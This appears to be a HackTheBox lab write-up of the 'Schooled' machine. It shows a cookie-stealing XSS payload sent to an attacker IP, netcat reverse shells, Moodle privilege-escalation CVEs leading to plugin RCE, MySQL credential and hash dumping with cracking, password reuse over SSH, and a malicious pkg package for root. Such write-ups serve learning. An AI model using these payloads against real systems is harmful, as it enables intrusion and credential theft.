---
Category:
  - B2R
Difficulty: Medium
Platform: HackTheBox
Status: 3. Complete
tags: [FreeBSD, GTFObins, Moodle, credentials-reuse, hardcoded-credentials, moodle-custom-plugin, moodle-log-in-as, privesc/pkg, XSS]
---
# Resolution summary

>[!summary]
>- Sub domain enumeration revealed the presence of a **moodle** web site vulnerable to **XSS**
>- Exploiting the XSS it was possible to **steal a teacher cookie** and get access with its account
>- This particular version of moodle is vulnerable to **privilege escalation** through the '**log in as**' feature available for teachers, allowing to escalate to manager and execute **arbitrary command** by installing a **malicious plugin**
>- Local enumeration of the moodle source code revealed **mysql hardcoded credentials**, allowing to extract users hashes and crack them
>- Because jamie **reused his password** it was possible to crack it and use it to gain access to the target
>- jamie had **sudo** privileges to execute the **pkg** binary, allowing to craft a malicious package which provided high privileged code execution

---

# Information Gathering

Scanned all TCP ports:

```bash
┌──(kali㉿kali)-[~/CTFs/HTB/box/Schooled]
└─$ sudo nmap -p- 10.10.10.234 -sS -Pn -v -oN scans/all-tcp-ports.txt
...
PORT      STATE    SERVICE
21/tcp    filtered ftp
22/tcp    open     ssh
80/tcp    open     http
110/tcp   filtered pop3
445/tcp   filtered microsoft-ds
5298/tcp  filtered presence
30984/tcp filtered unknown
33060/tcp open     mysqlx
41626/tcp filtered unknown
...
```

Enumerated open TCP ports:

```bash
┌──(kali㉿kali)-[~/CTFs/HTB/box/Schooled]
└─$ sudo nmap -p22,80,33060 -sC -sV -sT -A -oN scans/open-tcp-ports.txt 10.10.10.234
[sudo] password for kali:
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-09 08:08 EDT
Nmap scan report for 10.10.10.234
Host is up (0.052s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.9 (FreeBSD 20200214; protocol 2.0)
| ssh-hostkey:
|   2048 1d:69:83:78:fc:91:f8:19:c8:75:a7:1e:76:45:05:dc (RSA)
|   256 e9:b2:d2:23:9d:cf:0e:63:e0:6d:b9:b1:a6:86:93:38 (ECDSA)
|_  256 7f:51:88:f7:3c:dd:77:5e:ba:25:4d:4c:09:25:ea:1f (ED25519)
80/tcp    open  http    Apache httpd 2.4.46 ((FreeBSD) PHP/7.4.15)
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.46 (FreeBSD) PHP/7.4.15
|_http-title: Schooled - A new kind of educational institute
33060/tcp open  mysqlx?
| fingerprint-strings:
|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp:
|     Invalid message"
|     HY000
|   LDAPBindReq:
|     *Parse error unserializing protobuf message"
|     HY000
|   oracle-tns:
|     Invalid message-frame."
|_    HY000
...
```

# Enumeration

## Port 80 - HTTP (Apache 2.4.46 + PHP 7.4.15)

Enumerated port 80 using a web browser:

![Pasted image 20210509145233.png](../../zzz_res/attachments/Pasted_image_20210509145233.png)

Enumerated web directories and files:

```bash
┌──(kali㉿kali)-[~/CTFs/HTB/box/Schooled]
└─$ gobuster dir -u http://10.10.10.234 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -o p80-directories.txt
...
/js                   (Status: 301) [Size: 231] [--> http://10.10.10.234/js/]
/css                  (Status: 301) [Size: 232] [--> http://10.10.10.234/css/]
/images               (Status: 301) [Size: 235] [--> http://10.10.10.234/images/]
/fonts                (Status: 301) [Size: 234] [--> http://10.10.10.234/fonts/]

┌──(kali㉿kali)-[~/CTFs/HTB/box/Schooled]
└─$ gobuster dir -u http://10.10.10.234 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt -o p80-files.txt
...
/index.html           (Status: 200) [Size: 20750]
/contact.html         (Status: 200) [Size: 11066]
/.htaccess            (Status: 403) [Size: 199]
/style.css            (Status: 200) [Size: 71078]
/.                    (Status: 200) [Size: 20750]
/about.html           (Status: 200) [Size: 17784]
/.html                (Status: 403) [Size: 199]
/.htpasswd            (Status: 403) [Size: 199]
/.htm                 (Status: 403) [Size: 199]
/.htpasswds           (Status: 403) [Size: 199]
/.htgroup             (Status: 403) [Size: 199]
/.htaccess.bak        (Status: 403) [Size: 199]
/.htuser              (Status: 403) [Size: 199]
/.ht                  (Status: 403) [Size: 199]
/.htc                 (Status: 403) [Size: 199]
/teachers.html        (Status: 200) [Size: 15997]
```

Enumerated subdomain and virtual hosts:

```bash
┌──(kali㉿kali)-[~/CTFs/HTB/box/Schooled]
└─$ gobuster vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u 'http://schooled.htb/'
...
Found: moodle.schooled.htb (Status: 200) [Size: 84]
```

### moodle.schooled.htb

![Pasted image 20210509223333.png](../../zzz_res/attachments/Pasted_image_20210509223333.png)

Created new account:

>[!important]
>maoutis     maoutis@student.schooled.htb     Qwerty123!

Enrolled within Mathematics course:

![Pasted image 20210510233942.png](../../zzz_res/attachments/Pasted_image_20210510233942.png)

![Pasted image 20210510234055.png](../../zzz_res/attachments/Pasted_image_20210510234055.png)

# Exploitation

## XSS in moodlenet field CVE-2020-25627) --> Moodle 3.9/3.9.1!!!)

[Cross-site Scripting (XSS) in moodle/moodle | CVE-2020-25627 | Snyk](https://security.snyk.io/vuln/SNYK-PHP-MOODLEMOODLE-1049535)

![Pasted image 20210510234800.png](../../zzz_res/attachments/Pasted_image_20210510234800.png)

![Pasted image 20210510234738.png](../../zzz_res/attachments/Pasted_image_20210510234738.png)

Injected the XSS payload:

```jsx
"><script> new Image().src = "http://10.10.14.24/log.php?q="+document.cookie;</script>
```

Obtained teacher cookie and replaced the current one in order to impersonate him:

```python
┌──(kali㉿kali)-[/opt/enum]
└─$ sudo python3 -m http.server 80
[sudo] password for kali:
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.14.24 - - [10/May/2021 17:54:29] code 404, message File not found
10.10.14.24 - - [10/May/2021 17:54:29] "GET /log.php?q=MoodleSession=btd4thk6pomprao99q97bp850l HTTP/1.1" 404 -
10.10.10.234 - - [10/May/2021 17:54:43] code 404, message File not found
10.10.10.234 - - [10/May/2021 17:54:43] "GET /log.php?q=MoodleSession=bpdmaqp357m2126eligi131chh HTTP/1.1" 404 -
```

![Pasted image 20210510235931.png](../../zzz_res/attachments/Pasted_image_20210510235931.png)

## Moodle Privilege Escalation to Admin (CVE-2020-14321)

Course enrolments allowed privilege escalation from teacher role into manager role to RCE:

[https://github.com/HoangKien1020/CVE-2020-14321](https://github.com/HoangKien1020/CVE-2020-14321)

[CVE-2020-14321](https://player.vimeo.com/video/441698193?h=93f9bf0f35)

Escalated to Manager:

![Pasted image 20210511172323.png](../../zzz_res/attachments/Pasted_image_20210511172323.png)

![Pasted image 20210511172501.png](../../zzz_res/attachments/Pasted_image_20210511172501.png)

![Pasted image 20210511174537.png](../../zzz_res/attachments/Pasted_image_20210511174537.png)

Added Lianne to the course:

![Pasted image 20210511175352.png](../../zzz_res/attachments/Pasted_image_20210511175352.png)

## CVE-2020-25629

Affected versions of this package are vulnerable to Privilege Escalation. Users with "Log in as" capability in a course context (typically, course managers) may gain access to some site administration capabilities by "logging in as" a System manager.

![Pasted image 20210511175915.png](../../zzz_res/attachments/Pasted_image_20210511175915.png)

![Pasted image 20210511180056.png](../../zzz_res/attachments/Pasted_image_20210511180056.png)

Accessed administration panel and enabled all the privileges:

![Pasted image 20210511180219.png](../../zzz_res/attachments/Pasted_image_20210511180219.png)

![Pasted image 20210511181102.png](../../zzz_res/attachments/Pasted_image_20210511181102.png)

## Remote Code Execution

[https://github.com/HoangKien1020/Moodle_RCE](https://github.com/HoangKien1020/Moodle_RCE)

Installed a malicious plugin:

![Pasted image 20210511181154.png](../../zzz_res/attachments/Pasted_image_20210511181154.png)

![Pasted image 20210511181349.png](../../zzz_res/attachments/Pasted_image_20210511181349.png)

[http://moodle.schooled.htb/moodle/blocks/rce/lang/en/block_rce.php?cmd=whoami](http://moodle.schooled.htb/moodle/blocks/rce/lang/en/block_rce.php?cmd=whoami)

![Pasted image 20210511181703.png](../../zzz_res/attachments/Pasted_image_20210511181703.png)

Executed a reverse shell BST type payload:

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.24 10099 >/tmp/f
```

![Pasted image 20210511182423.png](../../zzz_res/attachments/Pasted_image_20210511182423.png)

```bash
┌──(kali㉿kali)-[~/…/HTB/box/Schooled/exploit]
└─$ nc -nlvp 10099
listening on [any] 10099 ...
connect to [10.10.14.24] from (UNKNOWN) [10.10.10.234] 58314
sh: can't access tty; job control turned off
$ id
uid=80(www) gid=80(www) groups=80(www)
```

# Lateral Movement to jamie

## Local enumeration

Enumerated local users:

```bash
$ ls -al /home/
total 26
drwxr-xr-x   4 root   wheel   4 Mar 16 06:33 .
drwxr-xr-x  16 root   wheel  16 Feb 26 22:46 ..
drwx------   2 jamie  jamie  11 Feb 28 18:13 jamie
drwx------   5 steve  steve  14 Mar 17 14:05 steve

$ cat /etc/passwd | grep -v nologin
# $FreeBSD$
#
root:*:0:0:Charlie &:/root:/bin/csh
toor:*:0:0:Bourne-again Superuser:/root:
uucp:*:66:66:UUCP pseudo-user:/var/spool/uucppublic:/usr/local/libexec/uucp/uucico
jamie:*:1001:1001:Jamie:/home/jamie:/bin/sh
steve:*:1002:1002:User &:/home/steve:/bin/csh
```

Enumerated system information:

```bash
[+] Operative system
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#kernel-exploits
FreeBSD Schooled 13.0-BETA3 FreeBSD 13.0-BETA3 #0 releng/13.0-n244525-150b4388d3b: Fri Feb 19 04:04:34 UTC 2021     root@releng1.nyi.freebsd.org:/usr/obj/usr/src/amd64.amd64/sys/GENERIC  amd64
```

Extracted MySQL credentials from moodle's config file:

```php
$ cat config.php
<?php  // Moodle configuration file

unset($CFG);
global $CFG;
$CFG = new stdClass();

$CFG->dbtype    = 'mysqli';
$CFG->dblibrary = 'native';
$CFG->dbhost    = 'localhost';
$CFG->dbname    = 'moodle';
$CFG->dbuser    = 'moodle';
$CFG->dbpass    = 'PlaybookMaster2020';
$CFG->prefix    = 'mdl_';
$CFG->dboptions = array (
  'dbpersist' => 0,
  'dbport' => 3306,
  'dbsocket' => '',
  'dbcollation' => 'utf8_unicode_ci',
);

$CFG->wwwroot   = 'http://moodle.schooled.htb/moodle';
$CFG->dataroot  = '/usr/local/www/apache24/moodledata';
$CFG->admin     = 'admin';

$CFG->directorypermissions = 0777;

require_once(__DIR__ . '/lib/setup.php');

// There is no php closing tag in this file,
// it is intentional because it prevents trailing whitespace problems!
```

>[!important]
>moodle     PlaybookMaster2020

MySQL enumeration:

```bash
$ /usr/local/bin/mysql -u moodle --password='PlaybookMaster2020' -D moodle -e 'show tables;'
...
mdl_user
...
$ /usr/local/bin/mysql -u moodle --password='PlaybookMaster2020' -D moodle -e 'select username,password from mdl_user;'
mysql: [Warning] Using a password on the command line interface can be insecure.
username        password
guest   $2y$10$u8DkSWjhZnQhBk1a0g1ug.x79uhkx/sa7euU8TI4FX4TCaXK6uQk2
admin   $2y$10$3D/gznFHdpV6PXt1cLPhX.ViTgs87DCE5KqphQhGYR5GFbcl4qTiW
bell_oliver89   $2y$10$N0feGGafBvl.g6LNBKXPVOpkvs8y/axSPyXb46HiFP3C9c42dhvgK
orchid_sheila89 $2y$10$YMsy0e4x4vKq7HxMsDk.OehnmAcc8tFa0lzj5b1Zc8IhqZx03aryC
chard_ellzabeth89       $2y$10$D0Hu9XehYbTxNsf/uZrxXeRp/6pmT1/6A.Q2CZhbR26lCPtf68wUC
morris_jake89   $2y$10$UieCKjut2IMiglWqRCkSzerF.8AnR8NtOLFmDUcQa90lair7LndRy
heel_james89    $2y$10$sjk.jJKsfnLG4r5rYytMge4sJWj4ZY8xeWRIrepPJ8oWlynRc9Eim
nash_michael89  $2y$10$yShrS/zCD1Uoy0JMZPCDB.saWGsPUrPyQZ4eAS50jGZUp8zsqF8tu
singh_rakesh89  $2y$10$Yd52KrjMGJwPUeDQRU7wNu6xjTMobTWq3eEzMWeA2KsfAPAcHSUPu
taint_marcus89  $2y$10$kFO4L15Elng2Z2R4cCkbdOHyh5rKwnG4csQ0gWUeu2bJGt4Mxswoa
walls_shaun89   $2y$10$EDXwQZ9Dp6UNHjAF.ZXY2uKV5NBjNBiLx/WnwHiQ87Dk90yZHf3ga
smith_john89    $2y$10$YRdwHxfstP0on0Yzd2jkNe/YE/9PDv/YC2aVtC97mz5RZnqsZ/5Em
white_jack89    $2y$10$PRy8LErZpSKT7YuSxlWntOWK/5LmSEPYLafDd13Nv36MxlT5yOZqK
travis_carl89   $2y$10$VO/MiMUhZGoZmWiY7jQxz.Gu8xeThHXCczYB0nYsZr7J5PZ95gj9S
mac_amy89       $2y$10$PgOU/KKquLGxowyzPCUsi.QRTUIrPETU7q1DEDv2Dt.xAjPlTGK3i
james_boris89   $2y$10$N4hGccQNNM9oWJOm2uy1LuN50EtVcba/1MgsQ9P/hcwErzAYUtzWq
pierce_allan    $2y$10$ia9fKz9.arKUUBbaGo2FM.b7n/QU1WDAFRafgD6j7uXtzQxLyR3Zy
henry_william89 $2y$10$qj67d57dL/XzjCgE0qD1i.ION66fK0TgwCFou9yT6jbR7pFRXHmIu
harper_zoe89    $2y$10$mnYTPvYjDwQtQuZ9etlFmeiuIqTiYxVYkmruFIh4rWFkC3V1Y0zPy
wright_travis89 $2y$10$XFE/IKSMPg21lenhEfUoVemf4OrtLEL6w2kLIJdYceOOivRB7wnpm
allen_matthew89 $2y$10$kFYnbkwG.vqrorLlAz6hT.p0RqvBwZK2kiHT9v3SHGa8XTCKbwTZq
sanders_wallis89        $2y$10$br9VzK6V17zJttyB8jK9Tub/1l2h7mgX1E3qcUbLL.GY.JtIBDG5u
higgins_jane    $2y$10$n9SrsMwmiU.egHN60RleAOauTK2XShvjsCS0tAR6m54hR1Bba6ni2
phillips_manuel $2y$10$ZwxEs65Q0gO8rN8zpVGU2eYDvAoVmWYYEhHBPovIHr8HZGBvEYEYG
carter_lianne   $2y$10$jw.KgN/SIpG2MAKvW8qdiub67JD7STqIER1VeRvAH4fs/DPF57JZe
parker_dan89    $2y$10$MYvrCS5ykPXX0pjVuCGZOOPxgj.fiQAZXyufW5itreQEc2IB2.OSi
parker_tim89    $2y$10$YCYp8F91YdvY2QCg3Cl5r.jzYxMwkwEm/QBGYIs.apyeCeRD7OD6S
maoutis $2y$10$6lWwoum2tXK0U8AwZRUTjeiP0qjC/QqI9jASlLeI3EzSxtHzw47Re
tezter  $2y$10$ZQTwEHnNyxXYCPmlYZDEBeGOYLlb1kkVmgmtk2LjZarpkRNfNElTW
teztert $2y$10$JfKZmLPnL.xsFR5CR1wjverL829rCxyFltSNhaYrDaF7poG5nN1na
```

Cracked every hashes:

```bash
┌──(kali㉿kali)-[~/CTFs/HTB/box/Schooled]
└─$ cat loot/users.hash| awk -F ' ' '{ print $1 ":" $2}' > loot/users.list

┌──(kali㉿kali)-[~/CTFs/HTB/box/Schooled]
└─$ hashid '$2y$10$MYvrCS5ykPXX0pjVuCGZOOPxgj.fiQAZXyufW5itreQEc2IB2.OSi'
Analyzing '$2y$10$MYvrCS5ykPXX0pjVuCGZOOPxgj.fiQAZXyufW5itreQEc2IB2.OSi'
[+] Blowfish(OpenBSD)
[+] Woltlab Burning Board 4.x
[+] bcrypt

┌──(kali㉿kali)-[~/CTFs/HTB/box/Schooled]
└─$ hashcat -h | grep -i blowfish
   3200 | bcrypt $2*$, Blowfish (Unix)                     | Operating System
  18600 | Open Document Format (ODF) 1.1 (SHA-1, Blowfish) | Documents

┌──(kali㉿kali)-[~/CTFs/HTB/box/Schooled]
└─$ hashcat loot/users.list /usr/share/wordlists/rockyou.txt --force --username --separator ":" -o users.pwd -m3200
hashcat (v6.1.1) starting...
...
admin:$2y$10$3D/gznFHdpV6PXt1cLPhX.ViTgs87DCE5KqphQhGYR5GFbcl4qTiW:!QAZ2wsx
```

>[!important]
>admin     !QAZ2wsx

## Reused admin password and SSH as jamie

Logged through SSH using jamie password:

```bash
┌──(kali㉿kali)-[~/CTFs/HTB/box/Schooled]
└─$ ssh jamie@10.10.10.234
Password for jamie@Schooled: !QAZ2wsx
Last login: Tue May 11 20:44:42 2021 from 10.10.14.24
FreeBSD 13.0-BETA3 (GENERIC) #0 releng/13.0-n244525-150b4388d3b: Fri Feb 19 04:04:34 UTC 2021

Welcome to FreeBSD!

Release Notes, Errata: https://www.FreeBSD.org/releases/
Security Advisories:   https://www.FreeBSD.org/security/
FreeBSD Handbook:      https://www.FreeBSD.org/handbook/
FreeBSD FAQ:           https://www.FreeBSD.org/faq/
Questions List: https://lists.FreeBSD.org/mailman/listinfo/freebsd-questions/
FreeBSD Forums:        https://forums.FreeBSD.org/

Documents installed with the system are in the /usr/local/share/doc/freebsd/
directory, or can be installed later with:  pkg install en-freebsd-doc
For other languages, replace "en" with a language code like de or fr.

Show the version of FreeBSD installed:  freebsd-version ; uname -a
Please include that output and any error messages when posting questions.
Introduction to manual pages:  man man
FreeBSD directory layout:      man hier

To change this login announcement, see motd(5).
If you need to ask a question on the FreeBSD-questions mailing list then

        https://www.FreeBSD.org/doc/en_US.ISO8859-1/articles/\
                freebsd-questions/index.html

contains lots of useful advice to help you get the best results.
jamie@Schooled:~ $
```

# Privilege Escalation

## pkg privilege escalation

Enumerated sudo privileges:

```bash
jamie@Schooled:~ $ sudo -l
User jamie may run the following commands on Schooled:
    (ALL) NOPASSWD: /usr/sbin/pkg update
    (ALL) NOPASSWD: /usr/sbin/pkg install *
```

[pkg | GTFOBins](https://gtfobins.github.io/gtfobins/pkg/)

Generated PoC:

```bash
┌──(kali㉿kali)-[~/…/HTB/box/Schooled/exploit]
└─$ echo 'id' > x.sh

┌──(kali㉿kali)-[~/…/HTB/box/Schooled/exploit]
└─$ fpm -n x -s dir -t freebsd -a all --before-install x.sh .
DEPRECATION NOTICE: XZ::StreamWriter#close will automatically close the wrapped IO in the future. Use #finish to prevent that.
/var/lib/gems/2.7.0/gems/ruby-xz-0.2.3/lib/xz/stream_writer.rb:185:in `initialize'
        /var/lib/gems/2.7.0/gems/fpm-1.12.0/lib/fpm/package/freebsd.rb:85:in `new'
        /var/lib/gems/2.7.0/gems/fpm-1.12.0/lib/fpm/package/freebsd.rb:85:in `block in output'
        /var/lib/gems/2.7.0/gems/fpm-1.12.0/lib/fpm/package/freebsd.rb:84:in `open'
        /var/lib/gems/2.7.0/gems/fpm-1.12.0/lib/fpm/package/freebsd.rb:84:in `output'
        /var/lib/gems/2.7.0/gems/fpm-1.12.0/lib/fpm/command.rb:487:in `execute'
        /var/lib/gems/2.7.0/gems/clamp-1.0.1/lib/clamp/command.rb:68:in `run'
        /var/lib/gems/2.7.0/gems/fpm-1.12.0/lib/fpm/command.rb:574:in `run'
        /var/lib/gems/2.7.0/gems/clamp-1.0.1/lib/clamp/command.rb:133:in `run'
        /var/lib/gems/2.7.0/gems/fpm-1.12.0/bin/fpm:7:in `<top (required)>'
        /usr/local/bin/fpm:23:in `load'
        /usr/local/bin/fpm:23:in `<main>'
Created package {:path=>"x-1.0.txz"}

┌──(kali㉿kali)-[~/…/HTB/box/Schooled/exploit]
└─$ sudo python3 -m http.server 80
[sudo] password for kali:
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.234 - - [11/May/2021 15:45:14] "GET /x-1.0.txz HTTP/1.1" 200 -
10.10.10.234 - - [11/May/2021 15:45:27] "GET /x-1.0.txz HTTP/1.1" 200 -
```

Executed the PoC:

```bash
jamie@Schooled:~ $ curl 10.10.14.24/x-1.0.txz x-1.0.txz
Warning: Binary output can mess up your terminal. Use "--output -" to tell
Warning: curl to output it to your terminal anyway, or consider "--output
Warning: <FILE>" to save to a file.
jamie@Schooled:~ $ curl 10.10.14.24/x-1.0.txz -o x-1.0.txz
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  2572  100  2572    0     0  21256      0 --:--:-- --:--:-- --:--:-- 21256
jamie@Schooled:~ $ sudo pkg install -y --no-repo-update x-1.0.txz
pkg: Repository FreeBSD has a wrong packagesite, need to re-create database
pkg: Repository FreeBSD cannot be opened. 'pkg update' required
Checking integrity... done (0 conflicting)
The following 1 package(s) will be affected (of 0 checked):

New packages to be INSTALLED:
        x: 1.0

Number of packages to be installed: 1
[1/1] Installing x-1.0...
uid=0(root) gid=0(wheel) groups=0(wheel),5(operator)
Extracting x-1.0: 100%
```

Created a reverse shell exploit using the above PoC:

```bash
┌──(kali㉿kali)-[~/…/HTB/box/Schooled/exploit]
└─$ echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.24 10099 >/tmp/f' > pe.sh

┌──(kali㉿kali)-[~/…/HTB/box/Schooled/exploit]
└─$ fpm -n x -s dir -t freebsd -a all --before-install pe.sh .
DEPRECATION NOTICE: XZ::StreamWriter#close will automatically close the wrapped IO in the future. Use #finish to prevent that.
/var/lib/gems/2.7.0/gems/ruby-xz-0.2.3/lib/xz/stream_writer.rb:185:in `initialize'
        /var/lib/gems/2.7.0/gems/fpm-1.12.0/lib/fpm/package/freebsd.rb:85:in `new'
        /var/lib/gems/2.7.0/gems/fpm-1.12.0/lib/fpm/package/freebsd.rb:85:in `block in output'
        /var/lib/gems/2.7.0/gems/fpm-1.12.0/lib/fpm/package/freebsd.rb:84:in `open'
        /var/lib/gems/2.7.0/gems/fpm-1.12.0/lib/fpm/package/freebsd.rb:84:in `output'
        /var/lib/gems/2.7.0/gems/fpm-1.12.0/lib/fpm/command.rb:487:in `execute'
        /var/lib/gems/2.7.0/gems/clamp-1.0.1/lib/clamp/command.rb:68:in `run'
        /var/lib/gems/2.7.0/gems/fpm-1.12.0/lib/fpm/command.rb:574:in `run'
        /var/lib/gems/2.7.0/gems/clamp-1.0.1/lib/clamp/command.rb:133:in `run'
        /var/lib/gems/2.7.0/gems/fpm-1.12.0/bin/fpm:7:in `<top (required)>'
        /usr/local/bin/fpm:23:in `load'
        /usr/local/bin/fpm:23:in `<main>'
Created package {:path=>"x-1.0.txz"}

┌──(kali㉿kali)-[~/…/HTB/box/Schooled/exploit]
└─$ sudo python3 -m http.server 80                                                   
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Downloaded and executed the exploit:

```bash
jamie@Schooled:~ $ curl 10.10.14.24/x-1.0.txz -o x-1.0.txz
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  2624  100  2624    0     0  23428      0 --:--:-- --:--:-- --:--:-- 23221
jamie@Schooled:~ $ sudo pkg install -y --no-repo-update x-1.0.txz
pkg: Repository FreeBSD has a wrong packagesite, need to re-create database
pkg: Repository FreeBSD cannot be opened. 'pkg update' required
Checking integrity... done (0 conflicting)
The following 1 package(s) will be affected (of 0 checked):

New packages to be INSTALLED:
        x: 1.0

Number of packages to be installed: 1
[1/1] Installing x-1.0...
```

Obtained the high privileged reverse shell:

```bash
┌──(kali㉿kali)-[~/…/HTB/box/Schooled/exploit]
└─$ nc -nlvp 10099
listening on [any] 10099 ...
connect to [10.10.14.24] from (UNKNOWN) [10.10.10.234] 64025
# whoami && hostname && cat /root/root.txt && ifconfig
root
Schooled
230dfbea6a985be3b7eecd18d1238861
vmx0: flags=8863<UP,BROADCAST,RUNNING,SIMPLEX,MULTICAST> metric 0 mtu 1500
        options=4e403bb<RXCSUM,TXCSUM,VLAN_MTU,VLAN_HWTAGGING,JUMBO_MTU,VLAN_HWCSUM,TSO4,TSO6,VLAN_HWTSO,RXCSUM_IPV6,TXCSUM_IPV6,NOMAP>
        ether 00:50:56:b9:8b:31
        inet 10.10.10.234 netmask 0xffffff00 broadcast 10.10.10.255
        media: Ethernet autoselect
        status: active
        nd6 options=29<PERFORMNUD,IFDISABLED,AUTO_LINKLOCAL>
lo0: flags=8049<UP,LOOPBACK,RUNNING,MULTICAST> metric 0 mtu 16384
        options=680003<RXCSUM,TXCSUM,LINKSTATE,RXCSUM_IPV6,TXCSUM_IPV6>
        inet6 ::1 prefixlen 128
        inet6 fe80::1%lo0 prefixlen 64 scopeid 0x2
        inet 127.0.0.1 netmask 0xff000000
        groups: lo
        nd6 options=21<PERFORMNUD,AUTO_LINKLOCAL>
```

![Pasted image 20210511215900.png](../../zzz_res/attachments/Pasted_image_20210511215900.png)

# Trophy

>[!quote]
>The most powerful motivation is rejection.
>
>\- Anonymous
 
>[!success]
>**User.txt**
c4c2d2cc270b280fb90caf7274c57389

>[!success]
>**Root.txt**
>230dfbea6a985be3b7eecd18d1238861

**master.password**

```bash
# cat /etc/master.passwd | grep '\$'
# $FreeBSD$
root:$6$aHA/oB17Vb9TqNGn$GKTw/EWJfAl05/knP2YNId6xbyaAiGh.pfkeD5X/VQa/WtgI7jy5B7yO8Pvvyl1g3sbPATF3Mnn58sjXJgYAS0:0:0::0:0:Charlie &:/root:/bin/csh
jamie:$6$wlZRvujnMjbLCZeP$6uFTp13hL2w1q80YN1bQfCGPxf44thGortfInsVwsiWqr9XmErI2sDGulgELjYplHdDKdRjCG5E.zzcYBr9Rh.:1001:1001::0:0:Jamie:/home/jamie:/bin/sh
```